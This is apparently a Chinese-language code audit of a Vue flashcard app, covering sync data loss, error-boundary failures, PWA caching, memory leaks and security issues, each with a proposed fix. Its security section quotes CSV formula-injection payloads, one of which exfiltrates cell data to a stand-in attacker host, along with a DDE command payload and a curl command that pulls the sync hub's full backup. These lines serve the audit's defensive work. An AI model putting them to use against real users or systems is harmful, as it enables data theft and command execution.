## 一、总体结论

项目工程质量**中上**：同步合并的纯函数设计（`sync-manifest.js` 单一事实来源）、净化层（`sanitize.js` DOMPurify）、插件与 Agent 的开闭扩展点、清理钩子的覆盖率都做得扎实，40 个测试覆盖了黄金路径。

但存在**三类系统性风险**，且都已被真实 bug 验证过：

| 风险类型 | 已暴露的 bug | 同类隐患 |
|---|---|---|
| **模块初始化顺序** | 生产构建 EP/icons 跨 chunk 循环依赖 → TDZ 白屏 | 另有 2 处模块级循环依赖 + 顶层副作用（侥幸同 chunk） |
| **错误边界失效** | ErrorBoundary 因 `async` 导致 `return false` 失效 | 根组件与全局组件完全裸奔，App 抛错 = 纯白屏 |
| **时间戳契约** | WrongBook 误 bump `updatedAt` 覆盖他端编辑 | reviews 永不进增量包、lastSyncAt 水位错误 → **同步窗口内数据永久丢失** |

**最需要警惕的一点**：`syncWithHub` 是唯一自动同步路径，而 P0-1 + P0-2 同时存在于这条路径上——意味着当前多设备场景下**复习进度与同步窗口内的编辑均不可信**。

## 二、🔴 严重问题（必修）

### A. 同步与数据丢失（最高优先级）

#### P0-1 `reviews` 表永远不参与增量同步 —— 复习历史全量跨设备丢失
**位置**：`src/sync.js:99-102`
```js
parts[t.table] = rows.filter(r => (r.createdAt ?? r.startedAt ?? r.unlockedAt ?? r.t ?? 0) > since);
```
**原理**：`reviews` 行由 `src/repo.js:286-293` 写入，字段为 `{id, cardId, reviewedAt, rating, ...}`，**没有 `createdAt/startedAt/unlockedAt/t`** → 判定值恒为 `0`，`0 > since` 恒假。已用 `hub-data.json` 佐证：178 条 review 全部无 `createdAt`。
**后果**：设备 B 永远收不到设备 A 的新复习 → 复习热度、连续打卡、遗忘曲线、`selfExplanation` 全部残缺。
**修复**：
```js
const ID_ONLY_TS = { reviews: 'reviewedAt', pomoSessions: 'startedAt', achievements: 'unlockedAt', userOps: 't', embeddings: 'updatedAt' };
const tsField = ID_ONLY_TS[t.table];
parts[t.table] = rows.filter(r => Number(r[tsField] ?? r.updatedAt ?? r.createdAt ?? 0) > since);
```

#### P0-2 `lastSyncAt` 用同步**结束时刻**推进 → 窗口内变更永久漏传
**位置**：`src/sync.js:294-306`
**原理**：快照于 T0 建立，`fetch` + `importBackup`（大量 IDB 写入，可达数秒）后记为 T2；下次 `since = T2`，而 `[T0, T2]` 内的变更其时间戳 ≤ T2 被过滤，且 `since` 只增不减 → **永久静默丢失**。
**修复**：以抓取快照**之前**的时刻为水位：
```js
const startedAt = Date.now();   // 放在 buildIncrementalBackup 之前
localStorage.setItem(HUB_LAST_SYNC_KEY, String(Math.min(startedAt, backup.exportedAt || startedAt)));
```

#### P0-3 错题本"加入今日复习"误 bump `updatedAt` → 覆盖他端文字编辑
**位置**：`src/views/WrongBook.vue:124`
```js
await db.cards.update(card.id, { dueAt: Date.now(), updatedAt: Date.now() });
```
**原理**：内容侧按 `updatedAt` 决胜，此操作只该改调度（`dueAt` 属 SRS），却把本机**旧内容**推成 content winner，另一台设备的文字编辑被整段丢弃。
**修复**：改 `reviewedAt: Date.now()`（与 `Cards.vue:573` 的 `rescueCard` 一致，不动 `updatedAt`）。

### B. 运行时与白屏

#### R1 `ErrorBoundary` 的 `return false` 完全失效（异步钩子）
**位置**：`src/components/ErrorBoundary.vue:11-16`
```js
onErrorCaptured(async (err, instance, info) => { ...; return false; });  // ← async 返回 Promise
```
**原理**：Vue 判定是 `if (hook(...) === false) return`，`Promise === false` 为假 → **错误继续冒泡到根**，ErrorBoundary 只是多写一条日志。
**修复**：去掉 `async`，`logError` 改 fire-and-forget，同步 `return false`。

#### R2 路由外全局组件完全没有错误边界 → 整页白屏
**位置**：`src/App.vue:383-406`：`NavBar`/`FloatAssistant`/`NotificationBell`/`PlanReminderLayer`/`Intro`/`Guide`/`InkLandscape`/teleport 设置面板全部在边界外。App 是**根组件**，自身抛错 = 挂载失败 = 纯白屏，ErrorBoundary 不在其祖先链上救不了。
**修复**：`main.js` 给根套一层边界；各全局组件单独包 `<ErrorBoundary>`。

#### R3 IndexedDB 打开失败 → 全链路静默失败，用户误判"数据丢失"
**位置**：全项目 **0 处** `db.open()` / `VersionError` / `blocked` / `versionchange` 处理。
**触发**：无痕模式、配额写满、另一标签页占旧版本连接。
**后果**：所有 `db.*` reject，大量空 catch（`App.vue:168`、`Plans.vue:40`、`Sync.vue:36`、`Export.vue:38`…）→ UI 空列表且零提示。
**修复**：`src/db.js` 注册 `blocked`/`versionchange` 监听 + `db.open().catch` 记录 `dbStatus()`，`App.vue` 顶部用红色横幅消费。

#### R4 复习评分 `rate()` 无重入锁 → 重复记录 + 跳卡
**位置**：`src/views/Review.vue:227-254`。连按两次评分键（键盘 `1/2/3` 无 throttle）→ 两条 review 记录、`idx += 1` 执行两次**跳过一张卡**、错题重复入队。
**修复**：加 `rating` 重入标志 + `finally` 复位。同类：`Cards.vue:547 saveSmart()`、`CardModal.vue` 保存路径。

### C. 构建与 PWA

#### B1 autoUpdate 触发无提示强制刷新 → 编辑中数据丢失
**位置**：`vite.config.js:17` + `dist/sw.js` 的 `self.skipWaiting(), clientsClaim()` + 产物中 `activated → window.location.reload()`
**原理**：`activated` 回调对每次更新**无条件 reload**，不询问、不校验脏数据。发版后用户打开页面即触发。
**连带**：`src/utils/pwa.js:40-43` 的 `onNeedRefresh` 与 `App.vue:269` 的新版本横幅是**死代码**——autoUpdate 模式虚拟模块永不调用它（pwa.js 注释"由用户决定何时刷新"与实现相反）。
**修复**：改 `registerType:'prompt'`，或保留 autoUpdate 但加全局脏数据守卫。

#### B2 pdf.js worker（1.26MB `.mjs`）未进预缓存 → 离线 PDF 解析必失败
**位置**：`dist/assets/pdf.worker.min-CHFwMXne.mjs` 不在预缓存清单（清单里只有 77B 存根）
**原理**：非体积超限，是 workbox 默认 `globPatterns` 不含 `.mjs`。
**修复**：`workbox: { globPatterns: ['**/*.{js,mjs,css,html,ico,png,svg,wasm,woff2}'] }`

#### B3 `getPdfjs()` 永久缓存失败 Promise
**位置**：`src/utils/parsers-pdf.js:8-21`。失败后 `pdfjsPromise` 无重置 → 会话内 PDF 彻底不可用（与白屏同源：一次加载失败污染全局单例）。
**修复**：`.catch(e => { pdfjsPromise = null; throw e; })`

### D. 性能

#### E1 首屏 3.13MB，其中 1.24MB 是被误拖入的废代码
**位置**：`main.js:32` 静态 import `highlight.js/styles/github.css`（1.3KB CSS），而 `vite.config.js:102` 的 manualChunks 规则 `id.includes('node_modules/highlight.js')` 把**整个目录**（含 CSS 模块）归入 hljs chunk → CSS 模块在 Rollup 里是 JS 模块 → 入口 chunk **静态**引用了 979KB 的 hljs。
**实测**：`dist/assets/index-HT4eLD1w.js` 开头即 `import "./hljs-DogFlwDa.js"`，40 个 chunk 都静态引用它；`MarkdownRenderer.vue:21,29` 的动态 import 被完全抵消。
**修复**：
```js
if (id.includes('node_modules/highlight.js/lib')) return 'hljs';   // 只匹配 lib 源码
```
并把 CSS 移入 `MarkdownRenderer.vue` 动态加载。**收益：首屏 3.13MB → 约 1.9MB（-39%）**

#### E2 Dashboard.vue ECharts 实例从不销毁
**位置**：`views/Dashboard.vue:45` `echarts.init`，全文件**无** `onBeforeUnmount`/`dispose()`。Dashboard 是根路由，每次进出泄漏一个实例（3-5MB/次），50 次进出后 canvas 配额耗尽 → 整页崩溃。
**修复**：`onBeforeUnmount(() => { trendChart?.dispose(); trendChart = null; })`

#### E3 Cards.vue「分页模式」名不副实，全量渲染
**位置**：`views/Cards.vue:772-773` `<div v-for="item in items">` 无 slice、无页码（全文件无 pageSize 引用）。1 万张卡 = 1 万个 `.card-item` → 低端手机 DOM 构建 10s+ 或 OOM 白屏。

#### E4 ForgettingCurve.vue resize 监听器泄漏
**位置**：`components/ForgettingCurve.vue:128` 监听器写在 setup **顶层**（非 onMounted），永不移除，闭包持有已 dispose 的 chart → resize 时对已销毁实例调用抛错 + 无法 GC。

### E. 安全

#### S1 CSV/TSV 公式注入
**位置**：`src/utils/exporters.js:84-88`（`csvEscape`）、`src/sync.js:227-243`（导出 .tsv）
**原理**：只处理 `,` `"` `\r\n`，未中和单元格首字符 `= + - @`。卡片内容来自用户输入/apkg 导入/AI 生成/资料解析，数据不可信。
**载荷**：正面填 `=HYPERLINK("http://attacker/?d="&B1,"点击查看解析")`，导出后用 Excel/WPS 打开即触发；DDE 载荷 `=cmd|'/c calc'!A1`。
**修复**：
```js
if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;   // 前置单引号中和
```

#### S2 局域网同步：明文 + CORS 过宽 + 无请求体限制
**位置**：`sync-hub/hub.js:119-130`（readBody 无上限）、`:133/155/168`（`Access-Control-Allow-Origin: *`）、`:192`（token 明文比对）、`:213`（`listen('0.0.0.0')`）
**场景**：同网段任意主机可裸连；`curl http://<IP>:4780/backup -H "x-sync-token: ..."` 一次拿到全部 cards/reviews/**privacyRecords**；WiFi 嗅探可读 token 与整包数据；`*` 让任意网页跨域读取。
**修复**：请求体 64MB 上限 + `timingSafeEqual` 恒定时间比较 + CORS 收窄到 Origin 白名单 + 生产建议绑具体网卡 IP。

**构建**

**质量**
